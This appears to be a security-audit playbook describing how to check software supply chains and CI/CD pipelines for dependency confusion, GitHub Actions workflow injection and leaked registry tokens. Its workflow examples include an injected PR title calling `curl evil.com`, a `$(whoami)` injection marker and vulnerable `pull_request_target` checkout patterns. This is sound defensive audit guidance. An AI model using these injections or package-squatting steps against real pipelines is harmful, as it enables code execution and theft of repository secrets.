---
name: supply-chain-cicd-audit
description: Software supply chain security, dependency confusion, GitHub Actions workflow injection, exposed CI/CD secrets, and build pipeline privilege escalation.
playbook: web-security
---

# Software Supply Chain & CI/CD Security Audit

## Attack Vector Summary
Software supply chain vulnerabilities allow attackers to achieve remote code execution in developer environments or production build pipelines through dependency confusion (internal package name squatting on npm/PyPI/RubyGems), insecure CI/CD workflow configurations (e.g. `pull_request_target` triggers, unpinned actions), and exposed package registry tokens.

## Tactical Heuristics & Step-by-Step Flow

### 1. Dependency Confusion Identification
Extract private/internal package names from build manifests (`package.json`, `requirements.txt`, `pom.xml`, `go.mod`):
- Check if internal package names (e.g., `@internal-org/auth-helper`, `corp-utils`) are registered on public registries (`npmjs.com`, `pypi.org`, `rubygems.org`).
- Verify package registry resolution order in `.npmrc`, `pip.conf`, or `pom.xml`. If public registries take precedence without namespace scoping, dependency confusion is present.

### 2. GitHub Actions & CI/CD Workflow Audit
Inspect `.github/workflows/*.yml` for high-risk patterns:

```text
# 1. pull_request_target with Explicit Checkout of Untrusted Fork
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # DANGEROUS: Runs untrusted fork code with repo secrets!

# 2. Script Injection in Workflow Run Steps
- run: echo "PR Title: ${{ github.event.pull_request.title }}" # DANGEROUS: Title containing `$(curl evil.com)` executes!
- run: echo "Issue body: ${{ github.event.issue.body }}"

# 3. Unpinned Third-Party Actions
- uses: untrusted-author/action@main # Risk of upstream compromise
```

### 3. Registry Token & CI Artifact Auditing
- Check public CI/CD build logs (GitHub Actions, GitLab CI, CircleCI, Travis) for leaked environment variables, AWS keys, or npm publishing tokens.
- Inspect public container registries (Docker Hub, GitHub Container Registry `ghcr.io`) for exposed private images or embedded credentials.

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Dependency Confusion | Private package missing from public registry | Unregistered `@company/core-lib` on npm | Ability to register package and trigger install |
| Workflow Context Injection | Untrusted PR title evaluated directly in `run:` | `PR title: $(whoami)` in workflow | Shell command execution in CI runner |
| `pull_request_target` RCE | Checkout of fork PR in privileged context | Untrusted SHA checked out with secrets access | GITHUB_TOKEN or repository secrets exfiltration |

## Evidence Collection & Validation Gate
- For dependency confusion: verify package name is unclaimed on public registry (do NOT publish malware).
- For CI/CD injection: provide workflow file path, line numbers, and proof of unescaped expansion.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
